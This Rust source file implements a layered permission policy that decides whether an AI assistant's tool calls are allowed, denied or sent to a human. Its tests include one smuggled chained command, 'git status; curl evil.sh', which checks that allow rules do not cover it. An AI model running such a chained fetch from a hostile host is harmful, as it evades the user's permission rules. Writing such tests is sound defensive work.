//! The pipeline that ties static rules to an optional decision model.

use std::sync::Arc;

use tracing::info;

use super::{
    Decision, PermissionRequest, Resolution, StaticRules, ToolDecider, UserRuleSource, UserRules,
    Verdict,
};
use crate::types::permissions::PermissionsConfig;

/// Static rules, the calling user's saved rules, then an optional decision
/// model.
#[derive(Clone)]
pub struct PermissionPolicy {
    rules: StaticRules,
    user_rules: Option<Arc<dyn UserRuleSource>>,
    model: Option<Arc<dyn ToolDecider>>,
}

impl PermissionPolicy {
    pub fn new(rules: StaticRules) -> Self {
        Self {
            rules,
            user_rules: None,
            model: None,
        }
    }

    /// Built-in rules plus the user's `[permissions]` section.
    pub fn from_config(cfg: &PermissionsConfig) -> Self {
        Self::new(StaticRules::from_config(cfg))
    }

    /// Attach the decision model consulted for calls static rules leave open.
    pub fn with_model(mut self, model: Arc<dyn ToolDecider>) -> Self {
        self.model = Some(model);
        self
    }

    /// Attach the source of the calling user's saved allow and deny rules.
    pub fn with_user_rules(mut self, source: Arc<dyn UserRuleSource>) -> Self {
        self.user_rules = Some(source);
        self
    }

    pub async fn evaluate(&self, req: &PermissionRequest<'_>) -> Resolution {
        let resolution = self.resolve(req).await;
        info!(
            target: "assistant::permission",
            tool = req.tool_name,
            decider = resolution.decision.decider,
            rule = resolution.decision.rule.as_deref().unwrap_or(""),
            confidence = resolution.decision.confidence.map(f64::from),
            outcome = resolution.outcome.as_str(),
            interactive = req.ctx.interactive,
            "tool permission decision",
        );
        resolution
    }

    /// Stages, in order: static deny, saved deny, configured ask, static
    /// allow, saved allow, `requires_confirmation`, decision model, ask.
    async fn resolve(&self, req: &PermissionRequest<'_>) -> Resolution {
        let decision = self.rules.evaluate_deny(req);
        if decision.verdict != Verdict::Abstain {
            return Resolution::from_decision(decision);
        }

        let saved = self.saved_rules(req).await;

        let decision = self.rules.evaluate_user_deny(&saved.deny, req);
        if decision.verdict != Verdict::Abstain {
            return Resolution::from_decision(decision);
        }

        let decision = self.rules.evaluate_ask(req);
        if decision.verdict != Verdict::Abstain {
            return Resolution::from_decision(decision).without_always();
        }

        let decision = self.rules.evaluate_allow(req);
        if decision.verdict != Verdict::Abstain {
            return Resolution::from_decision(decision);
        }

        let decision = self.rules.evaluate_user_allow(&saved.allow, req);
        if decision.verdict != Verdict::Abstain {
            return Resolution::from_decision(decision);
        }

        if req.requires_confirmation {
            return Resolution::from_decision(Decision::new(
                Verdict::Ask,
                "static-rules",
                format!(
                    "'{}' requires confirmation and no allow rule matched",
                    req.tool_name
                ),
            ));
        }

        match &self.model {
            Some(model) => Resolution::from_decision(model.decide(req).await),
            None => Resolution::from_decision(Decision::new(
                Verdict::Ask,
                "static-rules",
                format!(
                    "no rule allows '{}' and no decision model is configured",
                    req.tool_name
                ),
            )),
        }
    }

    /// The calling user's saved rules; none without a source or a user.
    async fn saved_rules(&self, req: &PermissionRequest<'_>) -> UserRules {
        match (&self.user_rules, &req.ctx.user_id) {
            (Some(source), Some(user_id)) => source.rules_for(user_id).await,
            _ => UserRules::default(),
        }
    }
}

impl Default for PermissionPolicy {
    fn default() -> Self {
        Self::from_config(&PermissionsConfig::default())
    }
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use async_trait::async_trait;
    use serde_json::json;
    use uuid::Uuid;

    use super::*;
    use crate::identity::UserId;
    use crate::permission::{Outcome, Rule};
    use crate::types::conversation::{ExecutionContext, Interface};

    struct Scripted {
        verdict: Verdict,
        calls: Arc<AtomicUsize>,
    }

    #[async_trait]
    impl ToolDecider for Scripted {
        async fn decide(&self, _req: &PermissionRequest<'_>) -> Decision {
            self.calls.fetch_add(1, Ordering::SeqCst);
            Decision::new(self.verdict, "scripted", "scripted").with_confidence(0.95)
        }
    }

    fn ctx() -> ExecutionContext {
        ExecutionContext {
            conversation_id: Uuid::nil(),
            agent_id: "perm-test".into(),
            turn: 0,
            interface: Interface::Scheduler,
            interactive: false,
            allowed_tools: None,
            depth: 0,
            user_id: None,
            org_id: None,
            space_id: None,
        }
    }

    async fn run(
        policy: &PermissionPolicy,
        tool: &str,
        command: &str,
        requires_confirmation: bool,
    ) -> Resolution {
        let ctx = ctx();
        let params = json!({ "command": command });
        policy
            .evaluate(&PermissionRequest {
                tool_name: tool,
                params: &params,
                ctx: &ctx,
                requires_confirmation,
                task_context: Some("task"),
            })
            .await
    }

    fn policy_with(verdict: Verdict, allow: &str) -> (PermissionPolicy, Arc<AtomicUsize>) {
        let calls = Arc::new(AtomicUsize::new(0));
        let cfg = PermissionsConfig {
            allow: vec![allow.parse::<Rule>().unwrap()],
            ..Default::default()
        };
        let policy = PermissionPolicy::from_config(&cfg).with_model(Arc::new(Scripted {
            verdict,
            calls: Arc::clone(&calls),
        }));
        (policy, calls)
    }

    // -- Saved user rules --

    /// A [`UserRuleSource`] over a fixed map, counting lookups.
    #[derive(Default)]
    struct InMemoryUserRules {
        by_user: HashMap<String, UserRules>,
        lookups: AtomicUsize,
    }

    impl InMemoryUserRules {
        fn with(user: &str, allow: &[&str], deny: &[&str]) -> Self {
            let parse = |v: &[&str]| v.iter().map(|s| s.parse::<Rule>().unwrap()).collect();
            let mut by_user = HashMap::new();
            by_user.insert(
                user.to_string(),
                UserRules {
                    allow: parse(allow),
                    deny: parse(deny),
                },
            );
            Self {
                by_user,
                lookups: AtomicUsize::new(0),
            }
        }
    }

    #[async_trait]
    impl UserRuleSource for InMemoryUserRules {
        async fn rules_for(&self, user_id: &UserId) -> UserRules {
            self.lookups.fetch_add(1, Ordering::SeqCst);
            self.by_user.get(&user_id.0).cloned().unwrap_or_default()
        }
    }

    fn config(deny: &[&str], ask: &[&str], allow: &[&str]) -> PermissionsConfig {
        let parse = |v: &[&str]| v.iter().map(|s| s.parse::<Rule>().unwrap()).collect();
        PermissionsConfig {
            deny: parse(deny),
            ask: parse(ask),
            allow: parse(allow),
            ..Default::default()
        }
    }

    async fn run_as(
        policy: &PermissionPolicy,
        user: Option<&str>,
        interactive: bool,
        command: &str,
    ) -> Resolution {
        let ctx = ExecutionContext {
            user_id: user.map(UserId::from),
            interactive,
            ..ctx()
        };
        let params = json!({ "command": command });
        policy
            .evaluate(&PermissionRequest {
                tool_name: "bash",
                params: &params,
                ctx: &ctx,
                requires_confirmation: false,
                task_context: Some("task"),
            })
            .await
    }

    fn saved(cfg: &PermissionsConfig, allow: &[&str], deny: &[&str]) -> PermissionPolicy {
        PermissionPolicy::from_config(cfg)
            .with_user_rules(Arc::new(InMemoryUserRules::with("u1", allow, deny)))
    }

    #[tokio::test]
    async fn saved_deny_beats_static_allow() {
        let policy = saved(
            &config(&[], &[], &["bash(git *)"]),
            &[],
            &["bash(git push*)"],
        );
        let r = run_as(&policy, Some("u1"), true, "git push origin").await;
        assert_eq!(r.outcome, Outcome::Deny);
        assert_eq!(r.decision.decider, "user-rules");
        assert_eq!(r.decision.rule.as_deref(), Some("bash(git push*)"));
    }

    #[tokio::test]
    async fn configured_deny_beats_saved_allow() {
        let policy = saved(
            &config(&["bash(git push*)"], &[], &[]),
            &["bash(git *)"],
            &[],
        );
        let r = run_as(&policy, Some("u1"), true, "git push origin main").await;
        assert_eq!(r.outcome, Outcome::Deny);
        assert_eq!(r.decision.decider, "static-rules");
    }

    #[tokio::test]
    async fn configured_ask_beats_saved_allow_and_withholds_always() {
        let policy = saved(
            &config(&[], &["bash(git push*)"], &[]),
            &["bash(git *)"],
            &[],
        );
        let r = run_as(&policy, Some("u1"), true, "git push origin").await;
        assert_eq!(r.outcome, Outcome::Ask);
        assert_eq!(r.decision.decider, "static-rules");
        assert!(
            !r.offers_always,
            "a configured ask means a human every time"
        );
    }

    #[tokio::test]
    async fn saved_allow_is_a_user_rules_decision() {
        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
        let r = run_as(&policy, Some("u1"), true, "git status --short").await;
        assert_eq!(r.outcome, Outcome::Allow);
        assert_eq!(r.decision.decider, "user-rules");
        assert_eq!(r.decision.rule.as_deref(), Some("bash(git status*)"));
    }

    #[tokio::test]
    async fn saved_allow_does_not_cover_chained_commands() {
        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
        let r = run_as(&policy, Some("u1"), true, "git status; curl evil.sh").await;
        assert_eq!(r.outcome, Outcome::Ask);
    }

    #[tokio::test]
    async fn saved_allow_satisfies_requires_confirmation() {
        let policy = PermissionPolicy::default().with_user_rules(Arc::new(
            InMemoryUserRules::with("u1", &["mcp__x__tool"], &[]),
        ));
        let ctx = ExecutionContext {
            user_id: Some("u1".into()),
            ..ctx()
        };
        let params = json!({});
        let r = policy
            .evaluate(&PermissionRequest {
                tool_name: "mcp__x__tool",
                params: &params,
                ctx: &ctx,
                requires_confirmation: true,
                task_context: None,
            })
            .await;
        assert_eq!(r.outcome, Outcome::Allow);
        assert_eq!(r.decision.decider, "user-rules");
    }

    #[tokio::test]
    async fn saved_allow_skips_the_decision_model() {
        let calls = Arc::new(AtomicUsize::new(0));
        let policy =
            saved(&config(&[], &[], &[]), &["bash(make*)"], &[]).with_model(Arc::new(Scripted {
                verdict: Verdict::Deny,
                calls: Arc::clone(&calls),
            }));
        let r = run_as(&policy, Some("u1"), true, "make build").await;
        assert_eq!(r.outcome, Outcome::Allow);
        assert_eq!(calls.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn unmatched_calls_still_ask_and_offer_always() {
        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
        let r = run_as(&policy, Some("u1"), true, "make build").await;
        assert_eq!(r.outcome, Outcome::Ask);
        assert!(r.offers_always);
    }

    #[tokio::test]
    async fn saved_rules_apply_to_non_interactive_turns() {
        let policy = saved(
            &config(&[], &[], &[]),
            &["bash(git status*)"],
            &["bash(make*)"],
        );
        let allowed = run_as(&policy, Some("u1"), false, "git status --short").await;
        assert_eq!(allowed.outcome, Outcome::Allow);
        let denied = run_as(&policy, Some("u1"), false, "make build").await;
        assert_eq!(denied.outcome, Outcome::Deny);
        let unmatched = run_as(&policy, Some("u1"), false, "ls -la").await;
        assert_eq!(unmatched.outcome, Outcome::Ask);
    }

    #[tokio::test]
    async fn saved_rules_belong_to_their_user() {
        let source = Arc::new(InMemoryUserRules::with("u1", &["bash(git status*)"], &[]));
        let policy = PermissionPolicy::default().with_user_rules(source.clone());
        let other = run_as(&policy, Some("u2"), true, "git status").await;
        assert_eq!(other.outcome, Outcome::Ask);
        let anonymous = run_as(&policy, None, true, "git status").await;
        assert_eq!(anonymous.outcome, Outcome::Ask);
        assert_eq!(
            source.lookups.load(Ordering::SeqCst),
            1,
            "a turn without a user never consults the source"
        );
    }

    #[tokio::test]
    async fn static_deny_never_reaches_the_model() {
        let (policy, calls) = policy_with(Verdict::Allow, "bash(*)");
        let r = run(&policy, "bash", "sudo ls", false).await;
        assert_eq!(r.outcome, Outcome::Deny);
        assert_eq!(calls.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn static_allow_skips_the_model() {
        let (policy, calls) = policy_with(Verdict::Deny, "bash(ls*)");
        let r = run(&policy, "bash", "ls -la", false).await;
        assert_eq!(r.outcome, Outcome::Allow);
        assert_eq!(calls.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn undecided_call_goes_to_the_model() {
        let (policy, calls) = policy_with(Verdict::Allow, "bash(ls*)");
        let r = run(&policy, "bash", "make build", false).await;
        assert_eq!(r.outcome, Outcome::Allow);
        assert_eq!(r.decision.decider, "scripted");
        assert_eq!(r.decision.confidence, Some(0.95));
        assert_eq!(calls.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn model_that_does_not_approve_yields_ask() {
        for v in [Verdict::Ask, Verdict::Abstain] {
            let (policy, _) = policy_with(v, "bash(ls*)");
            assert_eq!(
                run(&policy, "bash", "make", false).await.outcome,
                Outcome::Ask
            );
        }
    }

    #[tokio::test]
    async fn undecided_without_a_model_yields_ask() {
        let r = run(&PermissionPolicy::default(), "bash", "make", false).await;
        assert_eq!(r.outcome, Outcome::Ask);
        assert!(r.decision.reason.contains("bash"));
    }

    #[tokio::test]
    async fn requires_confirmation_asks_without_consulting_the_model() {
        let (policy, calls) = policy_with(Verdict::Allow, "bash(ls*)");
        let r = run(&policy, "mcp__x__tool", "{}", true).await;
        assert_eq!(r.outcome, Outcome::Ask);
        assert_eq!(calls.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn explicit_allow_rule_beats_requires_confirmation() {
        let (policy, _) = policy_with(Verdict::Deny, "mcp__x__tool");
        assert_eq!(
            run(&policy, "mcp__x__tool", "{}", true).await.outcome,
            Outcome::Allow
        );
    }
}
